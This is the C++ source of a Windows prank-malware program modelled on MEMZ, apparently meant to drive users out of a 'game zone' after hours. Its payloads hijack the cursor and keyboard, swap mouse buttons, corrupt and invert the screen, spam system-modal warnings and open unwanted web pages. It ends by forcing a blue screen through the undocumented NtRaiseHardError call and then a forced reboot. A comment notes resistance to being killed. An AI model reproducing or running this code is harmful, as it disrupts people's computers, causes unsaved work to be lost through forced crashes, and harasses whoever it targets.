#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <iostream>
#include <atomic>
#include <thread>
#include <random>
#include <array>
#include <vector>
#include <functional>
#include <ctime>
#include <chrono>
#include <tchar.h>
#include <strsafe.h>

#pragma comment(lib, "wininet") // fixes weird thing with wininet unresolved symbols
#pragma comment(lib, "shell32")

// time scale changes how fast a minute actually is, default is 60 seconds, used for testing
constexpr auto TIME_SCALE = 60;
constexpr auto MAX_RUNTIME = 15;
constexpr auto REBOOT_BLUESCREEN = 1;
constexpr auto REBOOT_NORMAL = 0;

std::random_device rd;
std::mt19937 mt(rd());
std::atomic<int> runtime = 0;

void reboot(short type)
{
	if (type == REBOOT_BLUESCREEN) {
		// straight up copied from memz
		// Try to force BSOD first
		// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
		// This isn't even an exploit, it's just an undocumented feature.
		HMODULE ntdll;
		FARPROC RtlAdjustPrivilege;
		FARPROC NtRaiseHardError;
		if (ntdll = LoadLibraryA("ntdll")) {
			RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
			NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
			if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
				BOOLEAN tmp1; DWORD tmp2;
				((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
				((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
			}
		}
	}
	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

void PayloadMessageBox(void)
{
	const LPCTSTR messages[]{
		L"Please exit the game zone lol!",
		L"Smile. You are on camera.",
		L"You are in violation of act four, section 103.83b of the BOCAL 'game zone' agreement act.",
		L"Please log out.",
		L"Game zone hours are from 1800 to 2300.",
		L"you are not in the sudoers file.  This incident will be reported.",
		L"Error."
	};
	std::uniform_int_distribution<int> dist(0, sizeof(messages) / sizeof(*messages) - 1);

	for (;;) {
		// multithreading it breaks MessageBox
		//std::thread([&]() { 
		MessageBox(nullptr, messages[dist(mt)], L"Warning!", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
		//}).detach();
		std::this_thread::sleep_for(std::chrono::seconds((2 * MAX_RUNTIME) - runtime));
	}
}

void PayloadCursor(void)
{
	POINT cursor;
	std::uniform_int_distribution<int> dist(-1, 1);

	// ~DONE~: scale less horribly early
	//	Removed scaling, looks better with a static 1px movement every 20 msec
	for (;;) {
		GetCursorPos(&cursor);
		cursor.x += dist(mt) * (runtime);
		cursor.y += dist(mt) * (runtime);
		SetCursorPos(cursor.x, cursor.y);

		std::this_thread::sleep_for(std::chrono::milliseconds(20));
	}
}

void PayloadKeyboardInput(void)
{
	INPUT input;
	// 0-9 a-z
	// TODO: curate list
	std::uniform_int_distribution<int> dist(0x30, 0x5A);

	input.type = INPUT_KEYBOARD;
	input.ki.wScan = 0; // hardware scan code for key
	input.ki.time = 0;
	input.ki.dwExtraInfo = 0;
	input.ki.dwFlags = 0; // 0 for key press
	for (;;) {
		input.ki.wVk = dist(mt);
		SendInput(1, &input, sizeof(input));
		//input.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
		//SendInput(1, &input, sizeof(INPUT));
		std::this_thread::sleep_for(std::chrono::seconds(16 - runtime));
	}
}

void PayloadSwapMouseButtons(void)
{
	for (;;) {
		SwapMouseButton(false);
		std::this_thread::sleep_for(std::chrono::seconds(30 - (runtime * 2)));
		SwapMouseButton(true);
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

void PayloadScreenWobble(void)
{
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	auto x = GetSystemMetrics(SM_CXSCREEN);
	auto y = GetSystemMetrics(SM_CYSCREEN);


	for (;;) {
		for (int i = 0; i < runtime; i++) {
			BitBlt(hdc, 0, 0, x, y, hdc, -2, -2, SRCCOPY);
			BitBlt(hdc, 0, 0, x, y, hdc, 2, 2, SRCCOPY);
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}
		std::this_thread::sleep_for(std::chrono::seconds(MAX_RUNTIME - runtime));
	}
}


void PayloadScreenGlitch(void)
{
	auto x = GetSystemMetrics(SM_CXSCREEN);
	auto y = GetSystemMetrics(SM_CYSCREEN);
	std::uniform_int_distribution<int> dy(0, y);
	std::uniform_int_distribution<int> dx(0, y);

	int waittime = 15;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	for (;;) {
		int locx = dx(mt);
		int locy = dy(mt);

		BitBlt(hdc, 0, locy, x, 1, hdc, 0 , dy(mt), SRCCOPY);

		std::this_thread::sleep_for(std::chrono::seconds(15 - runtime));
	}
}


void PayloadInvertScreen(void) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	auto w = GetSystemMetrics(SM_CXSCREEN);
	auto h = GetSystemMetrics(SM_CYSCREEN);

	for (;;) {
		if (runtime > 14) {
			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		}
		std::this_thread::sleep_for(std::chrono::seconds(20 - runtime));
	}
}

bool PayloadBrowser_open_browser(const char* url, HWND parent = NULL)
{
	// Try normally, with the default verb (which will typically be "open")
	HINSTANCE result = ShellExecuteA(parent, NULL, url, NULL, NULL, SW_SHOWNORMAL);

	// If that fails due to privileges, let's ask for more and try again
	if ((int)result == SE_ERR_ACCESSDENIED) {
		std::cout << "NO PERMISSION" << std::endl;
		result = ShellExecuteA(parent, "runas", url, NULL, NULL, SW_SHOWNORMAL);
	}

	// Return whether or not we were successful.
	return ((int)result > 32);
}

void PayloadBrowser(void)
{
	LPCSTR searches[] = {
		"https://www.google.com/search?q=epic+gamer+montag",
		"https://www.google.com/search?client=firefox-b-1-d&q=how+to+use+cheatengine+to+hack+csgo",
		"https://youtu.be/dQw4w9WgXcQ",
		"http://csgojackpot.cash/",
		"http://www.dhmo.org/",
		"http://fakeupdate.net/win8/",
		"https://www.google.com/search?q=why+is+my+eye+twitching",
		"https://www.google.com/search?q=do+i+have+a+virus&oq=do+i+have+a+virus",
		"https://www.google.com/search?&q=help",
		"http://42chan.ml/" // lol
	};

	for (;;) {
		PayloadBrowser_open_browser(searches[mt() % sizeof(searches) / sizeof(*searches)]);
		std::this_thread::sleep_for(std::chrono::seconds(90 - (runtime * 2)));
	}
}

// todo:
//  DONE multithread 
//  anti killer - FIXED with scheduler
//  DONE bsod at end
void LaunchPayloads(void)
{
	std::array<std::function<void(void)>, 8> payloads = {
			PayloadKeyboardInput,
			PayloadSwapMouseButtons,
			PayloadCursor,
			PayloadScreenWobble,
			PayloadBrowser,
			PayloadScreenGlitch,
			PayloadMessageBox,
			PayloadInvertScreen
	};

	for (unsigned i = 0; i < payloads.size(); i++) {
		std::thread(payloads.at(i)).detach();
		std::this_thread::sleep_for(std::chrono::seconds(3));
	}
}

void PromptToLogOut(void) {
	auto msg = L"The game zone is closing now, please save your game and log out.";
	auto msgret = MessageBox(nullptr, msg, L"Game Over Man!", MB_YESNO | MB_ICONINFORMATION | MB_SYSTEMMODAL);
	auto x = GetSystemMetrics(SM_CXSCREEN);
	auto y = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	std::uniform_int_distribution<int> dy(0, y);
	std::uniform_int_distribution<int> dx(0, x);
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;

	if (msgret == IDNO) {
		for (int i = 0; i < 500; i++) {
			DrawIcon(hdc, dx(mt), dy(mt), LoadIcon(NULL, IDI_ERROR));
			DrawIcon(hdc, dx(mt), dy(mt), LoadIcon(NULL, IDI_WARNING));
			std::this_thread::sleep_for(std::chrono::milliseconds(1));
		}
	}
	reboot(REBOOT_BLUESCREEN);
}

int main(void)
{
	runtime = 10;
	PayloadCursor();
#if 0
	std::thread(PromptToLogOut).detach(); // go ahead and start fuckery, message box is just an easy way to log out early.
	std::thread(LaunchPayloads).detach(); // said fuckery
	for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
		std::cout << "time is " << runtime << std::endl;
		std::this_thread::sleep_for(std::chrono::minutes(1));
	}
	reboot(REBOOT_BLUESCREEN);
#endif
}